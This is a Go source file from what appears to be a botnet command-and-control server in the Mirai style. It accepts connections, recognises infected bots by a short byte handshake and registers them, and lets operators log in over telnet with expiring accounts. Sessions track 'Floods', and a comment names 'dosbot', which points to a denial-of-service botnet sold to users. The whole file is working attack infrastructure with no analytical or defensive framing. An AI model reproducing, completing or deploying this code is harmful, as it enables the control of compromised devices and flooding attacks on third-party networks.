package masters

import (
	"cnc/core/database"
	"cnc/core/masters/sessions"
	"cnc/core/slaves"
	"fmt"
	"net"
	"time"
)

func initialHandler(conn net.Conn) {
	err := conn.SetDeadline(time.Now().Add(10 * time.Second))
	if err != nil {
		return
	}

	buf := make([]byte, 32)
	l, err := conn.Read(buf)
	if err != nil || l <= 0 {
		return
	}

	if l == 4 && buf[0] == 0x00 && buf[1] == 0x00 && buf[2] == 0x00 {
		if buf[3] > 0 {
			stringLen := make([]byte, 1)
			l, err := conn.Read(stringLen)
			if err != nil || l <= 0 {
				return
			}
			var source string
			if stringLen[0] > 0 {
				sourceBuf := make([]byte, stringLen[0])
				l, err := conn.Read(sourceBuf)
				if err != nil || l <= 0 {
					return
				}
				source = string(sourceBuf)
			}
			slaves.NewBot(conn, buf[3], source).Handle()
		} else {
			slaves.NewBot(conn, buf[3], "").Handle()
		}
		return
	}

	NewAdmin(conn).Handle()
}

func (a *Admin) Handle() {
	a.Printf("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22")
	defer func() {
		a.Printf("\u001B[?1049l")
	}()

	err := Displayf(a, "assets/branding/login/username.txt", "")
	if err != nil {
		println(err.Error())
		return
	}
	username, err := a.ReadLine("", false)
	if err != nil {
		return
	}

	err = a.conn.SetDeadline(time.Now().Add(60 * time.Second))
	if err != nil {
		return
	}
	err = Displayf(a, "assets/branding/login/password.txt", "")
	if err != nil {
		println(err.Error())
		return
	}
	password, err := a.ReadLine("", true)
	if err != nil {
		return
	}
	err = a.conn.SetDeadline(time.Now().Add(120 * time.Second))
	if err != nil {
		return
	}

	if timedOut := isTimedOut(username); timedOut {
		a.Clear()
		err := Displayln(a, "./assets/branding/login/timedout.txt", username)
		if err != nil {
			return
		}

		timeoutInfo, exists := timeouts[username]
		if exists {
			remainingDuration := timeoutInfo.Timeout.Sub(time.Now())
			if remainingDuration > 0 {
				minutes := remainingDuration.Minutes()
				a.Printf("Your timeout expires in %.0f minutes.\n", minutes)
				time.Sleep(5 * time.Second)
				return
			} else {
				/* timeout expired, do nothing */
			}
		}
		return
	}

	var loggedIn bool
	var userInfo database.AccountInfo

	if loggedIn, userInfo, _ = database.DatabaseConnection.TryLogin(username, password, a.conn.RemoteAddr().String()); !loggedIn {
		Displayln(a, "assets/branding/login/invalid.txt", username)
		buf := make([]byte, 1)
		_, err := a.conn.Read(buf)
		if err != nil {
			return
		}
		KickUser(a.Session.Username)
	} else {
		/* not sure why dosbot is doing this lol */
		/*log.Printf("[admin - login] '%s' logged in from %s\n", username, a.conn.RemoteAddr().String())*/
	}

	if time.Now().After(userInfo.Expiry) {
		err := Displayln(a, "assets/branding/login/expired.txt", username)
		if err != nil {
			return
		}
		KickUser(a.Session.Username)
	}

	go func() {
		i := 0
		for {
			time.Sleep(time.Second)
			err := DisplayTitle(a, username)
			if err != nil {
				return
			}

			i++
			if i%10 == 0 {
				err := a.conn.SetDeadline(time.Now().Add(120 * time.Second))
				if err != nil {
					fmt.Printf("[admin - titleinvtl] %v", err)
					return
				}
			}
		}
	}()

	var Floods int

	var session = &sessions.Session{
		ID:       time.Now().UnixNano(),
		Username: username,
		Conn:     a.conn,
		Account:  userInfo,
		Floods:   Floods,
	}

	sessions.SessionMutex.Lock()
	sessions.Sessions[session.ID] = session
	sessions.SessionMutex.Unlock()

	a.Session = sessions.Sessions[session.ID]

	defer session.Remove()

	err = Displayln(a, "./assets/branding/user/banner.txt", a.Session.Username)
	if err != nil {
		return
	}
	a.Commands()
}
